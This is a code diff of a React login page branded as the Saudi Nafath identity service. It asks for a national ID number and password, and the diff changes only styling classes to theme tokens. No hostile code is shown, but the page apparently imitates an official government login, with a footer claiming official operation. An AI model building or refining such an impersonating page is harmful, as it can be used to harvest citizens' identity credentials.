@@ -106,16 +106,16 @@ export default function NafazPage() {
 
   return (
     <div
-      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
+      className="min-h-screen bg-gradient-to-br from-background to-muted"
       dir="rtl"
     >
-      <header className="bg-white shadow-sm border-b">
+      <header className="bg-card shadow-sm border-b border-border">
         <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
           <Button
             variant="ghost"
             size="icon"
             onClick={handleBack}
-            className="text-gray-600 hover:text-teal-600"
+            className="text-muted-foreground hover:text-foreground"
             data-testid="button-nafaz-back"
           >
             <ChevronRight className="w-6 h-6" />
@@ -124,16 +124,16 @@ export default function NafazPage() {
             <ShieldAlert className="w-8 h-8 text-teal-600" />
             <span className="text-xl font-bold text-teal-600">نفاذ</span>
           </div>
-          <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
+          <Menu className="w-6 h-6 text-muted-foreground cursor-pointer hover:text-foreground transition-colors" />
         </div>
       </header>
 
       <main className="p-4 space-y-6 max-w-2xl mx-auto py-8">
         <div className="text-center space-y-2">
-          <h1 className="text-2xl font-bold text-gray-800 mb-2">
+          <h1 className="text-2xl font-bold text-foreground mb-2">
             الدخول على النظام
           </h1>
-          <p className="text-gray-600 text-sm">
+          <p className="text-muted-foreground text-sm">
             استخدم تطبيق نفاذ للدخول بشكل آمن
           </p>
         </div>
@@ -147,20 +147,20 @@ export default function NafazPage() {
         </div>
 
         <form onSubmit={handleLogin}>
-          <Card className="bg-white shadow-lg border-0">
+          <Card className="bg-card shadow-lg border-border/60">
             <CardContent className="p-6 space-y-5">
               <div className="text-center">
-                <p className="text-gray-700 font-semibold mb-1">
+                <p className="text-foreground font-semibold mb-1">
                   رقم بطاقة الأحوال/الإقامة
                 </p>
-                <p className="text-sm text-gray-500">
+                <p className="text-sm text-muted-foreground">
                   أدخل رقم الهوية الخاص بك للمتابعة
                 </p>
               </div>
 
               <Input
                 placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
-                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
+                className="text-right h-12 text-lg transition-all"
                 dir="rtl"
                 value={idLogin}
                 onChange={(e) => setLoginID(e.target.value)}
@@ -170,7 +170,7 @@ export default function NafazPage() {
 
               <Input
                 placeholder="أدخل كلمة المرور الخاصة بك هنا"
-                className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
+                className="text-right h-12 text-lg transition-all"
                 dir="rtl"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
@@ -206,7 +206,7 @@ export default function NafazPage() {
               </Button>
 
               <div className="pt-4 border-t">
-                <div className="text-center text-gray-600 text-sm mb-3 font-medium">
+                <div className="text-center text-muted-foreground text-sm mb-3 font-medium">
                   لتحميل تطبيق نفاذ
                 </div>
                 <div className="flex justify-center gap-3">
@@ -258,13 +258,15 @@ export default function NafazPage() {
         </Card>
       </main>
 
-      <footer className="mt-12 p-6 bg-white border-t">
+      <footer className="mt-12 p-6 bg-card border-t border-border">
         <div className="text-center space-y-6 max-w-4xl mx-auto">
-          <div className="text-gray-600 text-sm font-medium">تطوير وتشغيل</div>
+          <div className="text-muted-foreground text-sm font-medium">
+            تطوير وتشغيل
+          </div>
           <div className="flex justify-center items-center">
             <div className="text-2xl font-bold text-teal-600">نفاذ</div>
           </div>
-          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
+          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-muted-foreground">
             <a
               href="#"
               className="hover:text-teal-600 transition-colors font-medium"
